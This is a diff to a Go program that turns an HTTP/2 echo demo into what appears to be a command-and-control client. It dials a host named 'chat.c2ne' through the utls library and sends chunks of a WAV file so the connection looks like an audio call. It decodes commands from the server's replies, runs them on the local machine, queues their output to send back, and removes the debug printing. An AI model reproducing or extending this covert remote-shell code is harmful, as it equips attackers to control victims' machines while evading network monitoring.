@@ -11,14 +11,17 @@ import (
 	"runtime"
 	"os/exec"
 	"strings"
+	"os"
 
 	utls "github.com/refraction-networking/utls"
 	"golang.org/x/net/http2"
 )
 
+var	baseAudioTrack []byte
+
 func dialH2()(*http2.ClientConn, error){
 
-	tcpConn, err := net.Dial("tcp", "127.0.0.1:8443")
+	tcpConn, err := net.Dial("tcp", "127.0.0.1:443")
 	if err != nil {
 		fmt.Println("tcp dial:", err)
 		return nil, err
@@ -57,11 +60,21 @@ func dialH2()(*http2.ClientConn, error){
 }
 
 func startAudioCall(clientConn *http2.ClientConn){
-	// io.Pipe — pw is what we write "HI" to
-	//           pr feeds into the request body the server reads
+	baseAudioTrack, _ = os.ReadFile("sample.wav")
+	//if err != nil{
+	//	fmt.Println("not in location file:", filename)
+	//}
+	index :=0
+	ChunkSize := 640 //per 20 ms
+	totalTrackBytes := len(baseAudioTrack)
+	byteOffset :=0
+	/*if index==0{
+		byteOffset+= int(h.DataStart) //TODO if it is the first chunk, dont include header in the chunk
+	}*/
+
 	pr, pw := io.Pipe()
 
-	req, err := http.NewRequest("POST", "https://localhost:8443/echo", pr)
+	req, err := http.NewRequest("POST", "https://chat.c2ne:443/call", pr)
 	if err != nil {
 		log.Fatal("new request:", err)
 	}
@@ -71,7 +84,6 @@ func startAudioCall(clientConn *http2.ClientConn){
 
 	// RoundTrip sends request headers and returns once response headers arrive
 	// pr keeps streaming request body data to server after this returns
-	// this is the HTTP/2 difference from HTTP/1.1 — headers and body are decoupled
 	resp, err := clientConn.RoundTrip(req)
 	if err != nil {
 		log.Fatal("roundtrip:", err)
@@ -80,22 +92,32 @@ func startAudioCall(clientConn *http2.ClientConn){
 
 	var wg sync.WaitGroup
 
-	// goroutine 1: write HI to server every 5 seconds via pw
+	// write a chunk of bytes every 20ms via pw
 	wg.Go(func() {
-		defer pw.Close() // closing pw signals EOF to server's r.Body
-		ticker := time.NewTicker(5 * time.Second)
+		defer pw.Close() // closing pw sends EOF to server's r.Body
+		ticker := time.NewTicker(5 * time.Millisecond)
 		defer ticker.Stop()
 		for {
-			t := <-ticker.C
-			msg := fmt.Sprintf("HI from client @ %s\n", t.Format("15:04:05"))
-			if _, err := fmt.Fprint(pw, msg); err != nil {
-				return
+			select{
+			case <-ticker.C:
+				num:=0
+				chunk := make([]byte, ChunkSize)
+				byteOffset = index*ChunkSize //TODO logic to set header byteoffset, if index=0
+				if byteOffset+ChunkSize > totalTrackBytes {
+					num =copy(chunk, baseAudioTrack[byteOffset:totalTrackBytes])
+					index=0
+				}else{
+					num =copy(chunk, baseAudioTrack[byteOffset:byteOffset+ChunkSize])
+				}
+				encodedChunk := encodingEngine(chunk, num)
+				//fmt.Println("enc len ", len(encodedChunk))
+				pw.Write(encodedChunk)
+				index++
 			}
-			fmt.Printf("client sent: %s", msg)
 		}
 	})
 
-	// goroutine 2: read HELLO from server via resp.Body (blocks until server writes)
+	//read HELLO from server via resp.Body (blocks until server writes)
 	wg.Go(func() {
 		defer resp.Body.Close()
 		buf := make([]byte, 1024)
@@ -103,12 +125,12 @@ func startAudioCall(clientConn *http2.ClientConn){
 			n, err := resp.Body.Read(buf)
 			if n > 0 {
 				cmd, isFullCmd := decoderEngine(buf[:n]) //might need to catch isFullCmd
-				if isFullCmd=="true"{//||isFullCmd=="none"{
-					fmt.Println("command ", cmd)
+				if isFullCmd=="true"{	//||isFullCmd=="none"{
+					//fmt.Println("command ", cmd)
 					executeCommand(cmd)
-				}else{
+				}/*else{
 					fmt.Println("full command recieved = ", isFullCmd)
-				}
+				}*/
 			}
 			if err != nil {
 				return
@@ -136,7 +158,7 @@ func executeCommand(finalCommand string){
 		case "cd":
 			targetDir ="/"
 			if len(args)>1{
-				if targetDir == "../"||targetDir == "../../"{
+				if targetDir == "../"||targetDir == "../../"{ //TODO -- write a better logic, like OS.chdir or somtn
 					targetDir = targetDir+args[1]
 				}
 				targetDir=args[1]
@@ -155,8 +177,9 @@ func executeCommand(finalCommand string){
 			formatted_out = strings.TrimSpace(string(res))
 		}
 
-		fmt.Println("formatted_out = ", formatted_out)
+		//fmt.Println("formatted_out = ", formatted_out)
 		//fmt.Println("output length - ", len(formatted_out)) 
+		cliMessageChan <- formatted_out
 	}
 }
 
@@ -164,5 +187,4 @@ func main() {
 	
 	clientConn, _ := dialH2()
 	startAudioCall(clientConn)
-
 }
